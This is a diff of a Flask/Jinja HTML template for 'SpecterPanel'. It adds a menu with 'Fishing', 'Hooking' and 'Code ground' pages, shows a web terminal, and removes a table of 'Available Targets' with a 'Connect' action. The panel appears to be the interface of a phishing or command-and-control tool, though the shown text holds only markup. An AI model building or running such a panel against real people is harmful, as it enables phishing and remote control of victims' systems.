@@ -3,38 +3,72 @@
 {% block title %}
 	profile
 {% endblock %}
-
+{% block menus %}
+<nav class="sidebar sidebar-offcanvas" id="sidebar">
+	<div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">
+		<a class="sidebar-brand brand-logo" href="/dashboard">SpecterPanel</a>
+		<a class="sidebar-brand brand-logo-mini" href="/dashboard">SP</a>
+	</div>
+	<ul class="nav">
+		<li class="nav-item nav-category">
+			<span class="nav-link">Menu Options</span>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/dashboard">
+				<span class="menu-icon">
+					<i class="mdi mdi-view-dashboard"></i>
+				</span>
+				<span class="menu-title">Dashboard</span>
+			</a>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/api_link">
+				<span class="menu-icon">
+					<i class="mdi mdi-webhook"></i>
+				</span>
+				<span class="menu-title">Api Link</span>
+			</a>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/fishing">
+				<span class="menu-icon">
+					<i class="mdi mdi-fish"></i>
+				</span>
+				<span class="menu-title">Fishing</span>
+			</a>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/hooking">
+				<span class="menu-icon">
+					<i class="mdi mdi-hook"></i>
+				</span>
+				<span class="menu-title">Hooking</span>
+			</a>
+		</li>
+		<li class="nav-item menu-items">
+			<a class="nav-link" href="/code">
+				<span class="menu-icon">
+					<i class="mdi mdi-code-braces"></i>
+				</span>
+				<span class="menu-title">Code ground</span>
+			</a>
+		</li>
+	</ul>
+</nav>
+{% endblock %}
 {% block style %}
 <link rel="stylesheet" href="{{ url_for('static', filename='css/terminal.css') }}">
 {% endblock %}
 
 {% block body %}
-    <div style="background-color: black; color: lime; display: none;" id="terminal">
+    
+    <div style="background-color: black; color: lime;" id="terminal">
 	    <h5>Welcome to Web Terminal!<br></h5><h5>--->Type help to see all avlible commands</h5><br>
 	    <div class="input-line">
 		    <span class="prompt">$</span>
 		    <input type="text" id="userInput" autofocus>
 	    </div>
     </div>
-    {% if targets | length !=0 %}
-        <table class="table">
-            <thead>
-                <tr>
-                    <th>Available Targets</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            {% for target in targets %}
-                <tr>
-                    <td>
-                        <label class="badge badge-danger" onclick="getCommands('{{ target[0]}}');">Connect</label>
-                        <label class="badge badge-success">Delete</label>
-                    </td>
-                </tr>
-            {% endfor %}
-        </table>
-    {% endif %}
-        
 
 {% endblock %}
 
